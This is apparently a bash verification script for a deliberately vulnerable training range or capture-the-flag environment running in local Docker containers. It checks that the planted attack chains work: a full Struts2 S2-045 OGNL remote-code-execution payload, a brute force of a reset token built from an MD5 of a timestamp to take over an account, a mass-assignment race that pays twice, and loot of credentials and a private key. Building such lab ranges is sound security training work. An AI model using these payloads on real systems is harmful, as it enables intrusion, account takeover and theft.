#!/usr/bin/env bash
# 精简版 (slim) 部署验证 — 在 dk-hk 上运行 (admin 侧断言 + nginx localhost 边缘测试)。
# 用法: bash tools/verify-slim.sh
set -uo pipefail
cd "$(dirname "$0")/.."
CF="docker compose -f docker-compose.slim.yml"
pass=0; fail=0
ok(){ echo "  [PASS] $1"; pass=$((pass+1)); }
no(){ echo "  [FAIL] $1"; fail=$((fail+1)); }
WWW="--resolve www.hengyuan.local:443:127.0.0.1"
SUP="--resolve supplier.hengyuan.local:443:127.0.0.1"

echo "== 容器状态 =="
$CF ps --format '{{.Name}}: {{.Status}}' 2>/dev/null

echo "== nginx 入口路由 (localhost) =="
curl -sk $WWW https://www.hengyuan.local/healthz 2>/dev/null | grep -q ok && ok "www /healthz" || no "www /healthz"
curl -sk $SUP https://supplier.hengyuan.local/ 2>/dev/null | grep -qi "供应商\|supplier" && ok "supplier vhost 路由" || no "supplier vhost"

echo "== A2 S2-045 RCE (echo id) =="
OGNL="%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#p=new java.lang.ProcessBuilder({'/bin/sh','-c',#cmd})).(#p.redirectErrorStream(true)).(#process=#p.start()).(#resp=@org.apache.struts2.ServletActionContext@getResponse()).(#ros=#resp.getOutputStream()).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush()).(#resp.flushBuffer())}"
S2RESP=$(curl -sk $SUP -X POST https://supplier.hengyuan.local/index.action -H "Content-Type: $OGNL" 2>/dev/null)
echo "$S2RESP" | grep -q "uid=" && ok "S2-045 回显 id" || no "S2-045 未回显"

echo "== A5 supplier db.properties loot (hy_app 凭证) =="
$CF exec -T supplier-portal sh -c 'cat /opt/tomcat/webapps/ROOT/WEB-INF/classes/db.properties 2>/dev/null' | grep -q "hy_app" && ok "db.properties 含 hy_app" || no "db.properties 缺失"

echo "== B1 portal IDOR + 重置 token 接管 + 登录 =="
$CF exec -T portal python - <<'PY' && ok "portal 逻辑链 (IDOR/reset/login)" || no "portal 逻辑链"
import urllib.request, json, hashlib, time
B="http://localhost:8000"
def post(p,d):
    return json.load(urllib.request.urlopen(urllib.request.Request(B+p,data=json.dumps(d).encode(),headers={"Content-Type":"application/json"})))
prof=json.load(urllib.request.urlopen(B+"/api/users/1001/profile")); assert prof["username"]=="zhang_wei", prof
post("/api/password-reset",{"uid":1001})
now=int(time.time()); done=False
for ts in range(now-60,now+1):
    tok=hashlib.md5(f"1001:{ts}".encode()).hexdigest()
    try:
        urllib.request.urlopen(B+f"/api/reset?uid=1001&token={tok}&new_password=Hacked@2023"); done=True; break
    except Exception: pass
assert done, "reset token 未命中"
r=post("/api/login",{"username":"zhang_wei","password":"Hacked@2023"}); assert r.get("access_token")
print("portal OK")
PY

echo "== B2/B3 OA 批量赋值 + 竞态双付 + flag =="
$CF exec -T oa python - <<'PY' && ok "OA 批量赋值+竞态 (flag)" || no "OA 逻辑链"
import urllib.request, json, threading
B="http://localhost:8000"
def req(p,d=None,method=None,tok=None):
    h={"Content-Type":"application/json"}
    if tok: h["Authorization"]="Bearer "+tok
    data=json.dumps(d).encode() if d is not None else None
    return json.load(urllib.request.urlopen(urllib.request.Request(B+p,data=data,headers=h,method=method)))
tok=req("/api/login",{"username":"zhang_wei","password":"Zhangwei@2023"})["access_token"]
req("/api/approvals/1",{"approvals":[{"step":"dept_manager","by":"x"},{"step":"finance_clerk","by":"zhang_wei"},{"step":"finance_director","by":"x"}],"current_step":3,"status":"approved","is_paid":False},method="PUT",tok=tok)
res=[]
def pay():
    try: res.append(req("/api/approvals/1/pay",{},method="POST",tok=tok))
    except Exception as e: res.append({"err":str(e)})
ts=[threading.Thread(target=pay) for _ in range(2)]
[t.start() for t in ts]; [t.join() for t in ts]
flags=[r.get("flag") for r in res if r.get("flag")]
assert flags, res
print("OA OK flags=",len(flags))
PY

echo "== redis 未授权 loot (gitea 凭证) =="
$CF exec -T redis redis-cli GET deploy:gitea 2>/dev/null | grep -q "hyadmin" && ok "redis deploy:gitea" || no "redis loot"

echo "== B6 Gitea infra-deploy 历史 flag/key =="
$CF exec -T gitea sh -c 'cd /data/git/repositories/hengyuan/infra-deploy.git 2>/dev/null && C=$(git rev-list --all --max-parents=0 HEAD | head -1) && git show $C:deploy/README.flag' 2>/dev/null | grep -q "flag{" && ok "gitea 历史 flag" || no "gitea 历史"
$CF exec -T gitea sh -c 'cd /data/git/repositories/hengyuan/infra-deploy.git 2>/dev/null && C=$(git rev-list --all --max-parents=0 HEAD | head -1) && git show $C:deploy/id_rsa' 2>/dev/null | grep -q "PRIVATE KEY" && ok "gitea 历史私钥可恢复" || no "gitea 私钥"

echo "== A5 postgres PII (hy_app) =="
$CF exec -T postgres psql -U hy_app -d hengyuan -tAc "SELECT note FROM customers WHERE note LIKE 'flag{%';" 2>/dev/null | grep -q "flag{" && ok "customers db-pii flag" || no "db-pii"

echo "== 诱饵 D1-D5 =="
curl -sk $WWW https://www.hengyuan.local/admin 2>/dev/null | grep -qi "admin\|管理" && ok "D1 /admin 假面板" || no "D1"
curl -sk $WWW "https://www.hengyuan.local/api/search?q=test'%20OR%201=1--" 2>/dev/null | grep -qi "mysql\|error" && ok "D2 SQLi tarpit 假错误" || no "D2"
curl -sk $SUP https://supplier.hengyuan.local/.git/HEAD 2>/dev/null | grep -q "ref:" && ok "D3 /.git 可 dump" || no "D3"
curl -sk $SUP https://supplier.hengyuan.local/server-status 2>/dev/null | grep -qi "2.5.30\|patched" && ok "D4 假 banner" || no "D4"
curl -sk $WWW https://www.hengyuan.local/flag.txt 2>/dev/null | grep -q "decoy_webroot" && ok "D5 假 flag" || no "D5"

echo "== 结果: PASS=$pass FAIL=$fail =="
[[ $fail -eq 0 ]]